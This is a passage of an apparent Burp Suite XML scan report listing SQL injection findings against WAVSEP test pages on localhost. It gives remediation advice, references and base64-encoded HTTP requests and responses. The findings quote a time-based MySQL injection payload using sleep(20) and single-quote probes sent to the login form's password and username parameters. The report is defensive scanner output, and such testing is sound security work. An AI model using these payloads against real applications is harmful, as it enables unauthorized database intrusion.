      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNzU5DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGFuIGluc2VydCAodmFsdWVzKSBzdGF0ZW1lbnQgd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjwhLS0KCUluc3BpcmVkIGJ5IGEgdnVsbmVyYWJsZSB0ZXN0IGNhc2Ugb3JpZ2luYWxseSB3cml0dGVuIGZvciB0aGUgT1dBU1AgWmVkIEF0dGFjayBQcm94eSAoWkFQKSBwcm9qZWN0CgkoaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL09XQVNQX1plZF9BdHRhY2tfUHJveHlfUHJvamVjdCkgCglPcmlnaW5hbCBBdXRob3I6IHBzaWlub24gKHBzaWlub25AZ21haWwuY29tKS4KLS0+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6549005842765787136</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp [password parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>password</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the password parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the password parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJyZ1c2VybmFtZT11c2VybmFtZQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTMwDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjQxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJydwYXNzd29yZCcnJyBhdCBsaW5lIDEKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJycmdXNlcm5hbWU9dXNlcm5hbWU=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjQxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicmdXNlcm5hbWU9dXNlcm5hbWU=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjAxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3475962703490343936</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJnVzZXJuYW1lPXVzZXJuYW1lJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTI4DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjAxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJ3Bhc3N3b3JkJycgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJnVzZXJuYW1lPXVzZXJuYW1lJyc=]]></request>
